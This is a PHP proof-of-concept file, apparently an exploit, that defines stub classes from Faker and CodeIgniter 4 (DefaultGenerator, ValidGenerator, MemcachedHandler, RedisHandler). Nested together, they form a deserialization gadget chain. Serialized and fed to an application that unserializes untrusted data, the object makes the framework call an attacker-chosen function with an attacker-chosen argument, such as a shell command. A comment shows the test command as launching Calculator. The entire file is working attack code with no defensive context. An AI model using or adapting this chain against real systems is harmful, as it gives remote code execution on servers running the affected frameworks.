<?php

namespace Faker
{
    class DefaultGenerator
    {
        protected $default;
        
        public function __construct($cmd)
        {
            $this->default = $cmd; //open /System/Applications/Calculator.app
        }
    }
}

namespace Faker
{
    class ValidGenerator
    {
        protected $generator;
        protected $validator;
        protected $maxRetries;

        public function __construct($generator, $func)
        {
            $this->maxRetries = 1; //执行次数
            $this->validator = $func;
            $this->generator = $generator;
        }
    }
}

namespace CodeIgniter\Session\Handlers
{
    class MemcachedHandler
    {
        public $lockKey = "Firebasky";
        public $memcached;

        public function __construct($memcached)
        {
            $this->memcached = $memcached;
        }
    }
}

namespace CodeIgniter\Cache\Handlers
{
    class RedisHandler
    {
        public $redis;

        public function __construct($func, $param)
        {
            $this->redis =
                new \CodeIgniter\Session\Handlers\MemcachedHandler(
                    new \Faker\ValidGenerator((new \Faker\DefaultGenerator($param)), $func)
                );
        }
    }
}
